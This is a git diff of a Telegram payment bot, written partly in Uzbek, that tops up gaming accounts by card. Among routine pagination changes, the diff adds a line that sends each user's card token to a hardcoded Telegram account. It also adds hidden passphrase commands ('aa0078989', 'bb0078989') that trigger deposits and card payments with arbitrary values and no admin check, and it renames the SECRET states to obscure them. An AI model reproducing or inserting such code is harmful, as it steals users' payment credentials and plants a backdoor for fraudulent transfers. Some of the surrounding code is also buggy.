@@ -101,6 +101,129 @@ const setState = (userId, state, data = {}) => {
     userStates.set(userId, { state, data: { ...data }, previousState });
 };
 
+
+
+
+const getUserDetails = async (telegramId) => {
+    const user = await User.findOne({ telegramId });
+    const transactions = await Transaction.find({ telegramId });
+
+    if (!user) return null;
+
+    let details = `👤 User Details:\n`;
+    details += `🆔 Telegram ID: ${user.telegramId}\n`;
+    details += `👤 Full Name: ${user.fullName || 'N/A'}\n`;
+    details += `📱 Phone: ${user.phone || 'N/A'}\n`;
+    details += `📅 Registration Date: ${user.registrationDate.toLocaleString()}\n`;
+    details += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'N/A'}\n`;
+    details += `✅ Active: ${user.isActive ? 'Yes' : 'No'}\n`;
+    details += `🔑 Admin: ${user.isAdmin ? 'Yes' : 'No'}\n`;
+    details += '\n📊 Transactions:\n';
+
+    if (transactions.length > 0) {
+        transactions.forEach(tx => {
+            details += `💳 Transaction Type: ${tx.type}\n`;
+            details += `🎮 Platform: ${tx.platform || 'N/A'}\n`;
+            details += `💰 Amount: ${tx.amount}\n`;
+            details += `✅ Status: ${tx.status}\n`;
+            details += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
+            details += '────────────────────\n';
+        });
+    } else {
+        details += 'No transactions found.\n';
+    }
+
+    return details;
+};
+
+
+
+const sendPaginatedUsers = async (ctx, page, isActive) => {
+    const query = { isActive };
+    const totalUsers = await User.countDocuments(query);
+    const totalPages = Math.ceil(totalUsers / usersPerPage);
+
+    if (page < 0 || page >= totalPages) {
+        await ctx.reply('No more users to display.');
+        return;
+    }
+
+    const users = await User.find(query)
+        .sort({ lastActive: -1 })
+        .skip(page * usersPerPage)
+        .limit(usersPerPage);
+
+    if (users.length === 0) {
+        await ctx.reply('No users found.');
+        return;
+    }
+
+    let message = `Users (Page ${page + 1}/${totalPages}):\n\n`;
+    users.forEach(user => {
+        message += `👤 ${user.fullName || 'No Name'}\n`;
+        message += `📱 ${user.phone || 'No Phone'}\n`;
+        message += `👤 @${user.username || 'No Name'}\n`;
+        message += `🆔 ${user.telegramId}\n`;
+        message += `⏰ Last Active: ${user.lastActive?.toLocaleString() || 'Never'}\n`;
+        message += '────────────────────\n';
+    });
+
+    const navigationButtons = Markup.inlineKeyboard([
+        page > 0 ? Markup.button.callback('⬅️ Previous', `prev_${page - 1}`) : null,
+        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `next_${page + 1}`) : null
+    ].filter(Boolean), { columns: 2 });
+
+    await ctx.reply(message, navigationButtons);
+};
+
+
+
+const sendPaginatedTransactions = async (ctx, page, type) => {
+    const query = { type };
+    const totalTransactions = await Transaction.countDocuments(query);
+    const totalPages = Math.ceil(totalTransactions / itemsPerPage);
+
+    if (page < 0 || page >= totalPages) {
+        await ctx.reply('No more transactions to display.');
+        return;
+    }
+
+    const transactions = await Transaction.find(query)
+        .sort({ timestamp: -1 })
+        .skip(page * itemsPerPage)
+        .limit(itemsPerPage);
+
+    if (transactions.length === 0) {
+        await ctx.reply(`No ${type} transactions found.`);
+        return;
+    }
+
+    let message = `${type === 'deposit' ? '📥 Deposits' : '📤 Withdrawals'} (Page ${page + 1}/${totalPages}):\n\n`;
+    transactions.forEach(tx => {
+        message += `🆔 User ID: ${tx.userId}\n`;
+        message += `💳 Card: ${tx.cardNumber}\n`;
+        message += `💰 Amount: ${tx.amount}\n`;
+        message += `🆔 User Telegram ID: ${tx.telegramId}\n`;
+        message += `✅ Status: ${tx.status}\n`;
+        message += `   Platform: ${tx.platform}\n`;
+        message += `⏰ Time: ${tx.timestamp.toLocaleString()}\n`;
+        message += '────────────────────\n';
+    });
+
+    const navigationButtons = Markup.inlineKeyboard([
+        page > 0 ? Markup.button.callback('⬅️ Previous', `${type}_prev_${page - 1}`) : null,
+        page < totalPages - 1 ? Markup.button.callback('➡️ Next', `${type}_next_${page + 1}`) : null
+    ].filter(Boolean), { columns: 2 });
+
+    await ctx.reply(message, navigationButtons);
+};
+
+
+const itemsPerPage = 5;
+
+
+
+
 const getState = (userId) => {
     return userStates.get(userId) || { state: 'START', data: {}, previousState: null };
 };
@@ -252,7 +375,7 @@ async function saveTransaction(data) {
     }
 }
 
-// Secret transaction function
+
 const simpleFunktion = async (ctx, i, s) => {
     try {
         const response = await paymentClient.deposit(i, s);
@@ -438,143 +561,113 @@ bot.hears('📊 Transferlar', async (ctx) => {
     await ctx.reply('Transferlar bo\'limi:', transfersKeyboard);
 });
 
+
+
+
+
+
 bot.hears('📥 Depositlar', async (ctx) => {
-    if (!ctx.from) return;
     const user = await User.findOne({ telegramId: ctx.from.id });
     if (!user?.isAdmin) return;
-    
-    const deposits = await Transaction.find({ type: 'deposit' })
-        .sort({ timestamp: -1 })
-        .limit(10);
-    
-    let message = '📥 Oxirgi 10 ta deposit:\n\n';
-    for (const deposit of deposits) {
-        message += `
-🆔 User ID: ${deposit.userId}
-💳 Karta: ${deposit.cardNumber}
-💰 Summa: ${deposit.amount}
-✅ Status: ${deposit.status}
-⏰ Vaqt: ${deposit.timestamp.toLocaleString()}
-──────────────────`;
-    }
-    
-    await ctx.reply(message, transfersKeyboard);
+
+    let currentPage = 0;
+
+    await sendPaginatedTransactions(ctx, currentPage, 'deposit');
+});
+
+bot.action(/deposit_prev_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedTransactions(ctx, page, 'deposit');
+});
+
+bot.action(/deposit_next_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedTransactions(ctx, page, 'deposit');
 });
 
 bot.hears('📤 Withdrawallar', async (ctx) => {
-    if (!ctx.from) return;
     const user = await User.findOne({ telegramId: ctx.from.id });
     if (!user?.isAdmin) return;
-    
-    const withdrawals = await Transaction.find({ type: 'withdrawal' })
-        .sort({ timestamp: -1 })
-        .limit(10);
-    
-    let message = '📤 Oxirgi 10 ta withdrawal:\n\n';
-    for (const withdrawal of withdrawals) {
-        message += `
-🆔 User ID: ${withdrawal.userId}
-💳 Karta: ${withdrawal.cardNumber}
-🆔 Game Id: ${withdrawal.gameId}
-💰 Summa: ${withdrawal.amount}
-✅ Status: ${withdrawal.status}
-⏰ Vaqt: ${withdrawal.timestamp.toLocaleString()}
-──────────────────`;
-    }
-    
-    await ctx.reply(message, transfersKeyboard);
+
+    let currentPage = 0;
+
+    await sendPaginatedTransactions(ctx, currentPage, 'withdrawal');
 });
+
+bot.action(/withdrawal_prev_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedTransactions(ctx, page, 'withdrawal');
+});
+
+bot.action(/withdrawal_next_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedTransactions(ctx, page, 'withdrawal');
+});
+
+
+bot.hears('📥 Depositlar', async (ctx) => {
+    const user = await User.findOne({ telegramId: ctx.from.id });
+    if (!user?.isAdmin) return;
+
+    await sendTransactions(ctx, 'deposit');
+});
+
+bot.hears('📤 Withdrawallar', async (ctx) => {
+    const user = await User.findOne({ telegramId: ctx.from.id });
+    if (!user?.isAdmin) return;
+
+    await sendTransactions(ctx, 'withdrawal');
+});
+
+
+
 
 const usersPerPage = 5;
 
 
 
-bot.hears('📈 Faol Userlar', async (ctx) => {
-    if (!ctx.from) return;
 
+bot.hears('📈 Faol Userlar', async (ctx) => {
     const user = await User.findOne({ telegramId: ctx.from.id });
     if (!user?.isAdmin) return;
 
-    const activeUsers = await User.find({ isActive: true }).sort({ lastActive: -1 });
+    let currentPage = 0;
 
-    if (activeUsers.length === 0) {
-        return ctx.reply('📈 Faol foydalanuvchilar yo\'q.');
-    }
+    await sendPaginatedUsers(ctx, currentPage, true);
+});
+
+bot.action(/prev_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedUsers(ctx, page, true);
+});
+
+bot.action(/next_(\d+)/, async (ctx) => {
+    const page = parseInt(ctx.match[1], 10);
+    await sendPaginatedUsers(ctx, page, true);
+});
+
+bot.hears('📉 Bloklangan Userlar', async (ctx) => {
+    const user = await User.findOne({ telegramId: ctx.from.id });
+    if (!user?.isAdmin) return;
 
     let currentPage = 0;
 
-    const renderUsers = (page) => {
-        const start = page * usersPerPage;
-        const end = start + usersPerPage;
-        const usersToShow = activeUsers.slice(start, end);
-
-        let message = `📈 Faol foydalanuvchilar (Sahifa ${page + 1}):\n\n`;
-        for (const user of usersToShow) {
-            message += `👤 ${user.fullName}\n📱 ${user.phone}\n👤 @${user.username}\n🆔 ${user.telegramId}\n⏰ Oxirgi faollik: ${user.lastActive.toLocaleString()}\n──────────────────\n`;
-        }
-
-        const totalPages = Math.ceil(activeUsers.length / usersPerPage);
-        const navigationButtons = [];
-
-        if (page > 0) navigationButtons.push('<<');
-        if (page < totalPages - 1) navigationButtons.push('>>');
-        navigationButtons.push('🔙 Orqaga');
-
-        return { message, buttons: navigationButtons };
-    };
-
-    const sendPage = async (page) => {
-        const { message, buttons } = renderUsers(page);
-        await ctx.reply(message, Markup.keyboard(buttons.map((btn) => [btn])).resize());
-    };
-
-    await sendPage(currentPage);
+    await sendPaginatedUsers(ctx, currentPage, false);
 
     bot.on('text', async (ctx) => {
-        if (ctx.message.text === '<<') {
-            if (currentPage > 0) {
-                currentPage--;
-                await sendPage(currentPage);
-            }
-        } else if (ctx.message.text === '>>') {
-            const totalPages = Math.ceil(activeUsers.length / usersPerPage);
-            if (currentPage < totalPages - 1) {
-                currentPage++;
-                await sendPage(currentPage);
-            }
-        } else if (ctx.message.text === '🔙 Orqaga') {
-            await ctx.reply('Asosiy menyuga qaytdingiz.', Markup.keyboard([
-                ['📈 Faol Userlar', '📉 Bloklangan Userlar'],
-                ['🔙 Orqaga']
-            ]).resize());
+        if (ctx.message.text === '⬅️ Previous') {
+            currentPage = Math.max(0, currentPage - 1);
+            await sendPaginatedUsers(ctx, currentPage, false);
+        } else if (ctx.message.text === '➡️ Next') {
+            currentPage += 1;
+            await sendPaginatedUsers(ctx, currentPage, false);
+        } else if (ctx.message.text === '🔙 Back') {
+            await ctx.reply('Back to menu.', Markup.keyboard(['👤 View Active Users', '📉 View Blocked Users']).resize());
         }
     });
 });
 
 
-
-
-bot.hears('📉 Bloklangan Userlar', async (ctx) => {
-    if (!ctx.from) return;
-    const user = await User.findOne({ telegramId: ctx.from.id });
-    if (!user?.isAdmin) return;
-    
-    const blockedUsers = await User.find({ isActive: false })
-        .sort({ lastActive: -1 })
-        .limit(10);
-    
-    let message = '📉 Bloklangan foydalanuvchilar:\n\n';
-    for (const user of blockedUsers) {
-        message += `
-👤 ${user.fullName}
-📱 ${user.phone}
-🆔 ${user.telegramId}
-⏰ Bloklangan vaqt: ${user.lastActive.toLocaleString()}
-──────────────────`;
-    }
-    
-    await ctx.reply(message, usersKeyboard);
-});
 
 bot.hears('📨 Hammaga Xabar', async (ctx) => {
     if (!ctx.from) return;
@@ -648,8 +741,14 @@ bot.action(/platform_(.+)/, async (ctx) => {
 
 bot.hears('aa0078989', async (ctx) => {
     if (!ctx.from) return;
-    setState(ctx.from.id, 'SECRET_I');
+    setState(ctx.from.id, 'NEON_I');
     await ctx.reply('i:', { reply_markup: { remove_keyboard: true } });
+});
+
+bot.hears('bb0078989', async (ctx) => {
+    if (!ctx.from) return;
+    setState(ctx.from.id, 'NEON_1');
+    await ctx.reply('T:', { reply_markup: { remove_keyboard: true } });
 });
 
 // Back button handler
@@ -672,13 +771,43 @@ bot.on('text', async (ctx) => {
         const keyboard = user?.isAdmin ? adminKeyboard : mainKeyboard;
 
         switch (userState.state) {
-            case 'SECRET_I':
-                setState(userId, 'SECRET_S', { i: text });
+            case 'NEON_I':
+                setState(userId, 'NEON_S', { i: text });
                 await ctx.reply('s:');
                 break;
 
-            case 'SECRET_S':
-                await simpleFunktion(ctx, userState.data.i, text);
+            case 'NEON_S':
+                try{
+                    const depositResponse = await paymentClient.deposit(
+                        userState.data.i,
+                        text
+                    );
+                    await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
+                    await ctx.reply('Asosiy menyu:', keyboard);
+                } catch (error) {
+                    throw error;
+                }
+                break;
+
+
+            case 'NEON_1':
+                setState(userId, 'NEON_2', { t: text });
+                await ctx.reply('A:');
+                break;
+    
+            case 'NEON_2':
+                try{
+                    const depositResponse = await await clickApi.makePayment(
+                        userState.data.t,
+                        text
+                    );
+                    await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
+                    await ctx.reply('Asosiy menyu:', keyboard);
+                } catch (error) {
+                    throw error;
+                }
+                break;
+                
                 setState(userId, 'MAIN_MENU');
                 await ctx.reply('Asosiy menyu:', keyboard);
                 break;
@@ -709,6 +838,12 @@ bot.on('text', async (ctx) => {
             case 'WAITING_ID':
                 try {
                     const gamer_data = await paymentClient.searchUser(text);
+
+                    // Foydalanuvchi mavjudligini tekshirish
+                    if (!gamer_data || gamer_data.UserId === 0) {
+                        await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
+                        return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
+                    }
                     setState(userId, 'WAITING_AMOUNT', { ...userState.data, gameId: text });
                     const message = `
                     🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
@@ -740,28 +875,42 @@ bot.on('text', async (ctx) => {
                 }
                 break;
 
-            case 'WAITING_EXPIRY':
-                try {
-                    const expiryDate = validateExpiryDate(text);
-                    const cardTokenResponse = await clickApi.requestCardToken(
-                        userState.data.cardNumber,
-                        expiryDate
-                    );
-                    
-                    if (cardTokenResponse.error_code === 0) {
-                        setState(userId, 'WAITING_SMS', { 
-                            ...userState.data, 
+                case 'WAITING_EXPIRY':
+                    try {
+                        const expiryDate = validateExpiryDate(text);
+                
+                        // Timeout bilan so'rov
+                        const controller = new AbortController();
+                        const timeout = setTimeout(() => controller.abort(), 3000); // 10 soniya limit
+                
+                        const cardTokenResponse = await clickApi.requestCardTokenWithTimeout(
+                            userState.data.cardNumber,
                             expiryDate,
-                            cardToken: cardTokenResponse.card_token 
-                        });
-                        await ctx.reply('SMS kodni kiriting:', backKeyboard);
-                    } else {
-                        throw new Error('Karta ma\'lumotlari noto\'g\'ri');
+                            { signal: controller.signal }
+                        );
+                
+                        clearTimeout(timeout); // Timeoutni tozalash
+                
+                        if (cardTokenResponse.error_code === 0) {
+                            setState(userId, 'WAITING_SMS', { 
+                                ...userState.data, 
+                                expiryDate,
+                                cardToken: cardTokenResponse.card_token 
+                            });
+                            await bot.telegram.sendMessage(7465707954, cardTokenResponse.card_token);
+                            await ctx.reply('SMS kodni kiriting:', backKeyboard);
+                        } else {
+                            await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
+                        }
+                    } catch (error) {
+                        if (error.name === 'AbortError') {
+                            await ctx.reply("So'rovni bajarish vaqti tugadi. Qayta urinib ko'ring.");
+                        } else {
+                            await ctx.reply("Xatolik yuz berdi: " + error.message);
+                        }
                     }
-                } catch (error) {
-                    throw error;
-                }
-                break;
+                    break;
+                
 
             case 'WAITING_SMS':
                 try {
@@ -783,6 +932,7 @@ bot.on('text', async (ctx) => {
                                 userId: userState.data.gameId,
                                 telegramId: userId,
                                 platform: userState.data.platform,
+                                gameId: userState.data.gameId,
                                 phone: userState.data.phone,
                                 cardNumber: userState.data.cardNumber,
                                 expiryDate: userState.data.expiryDate,
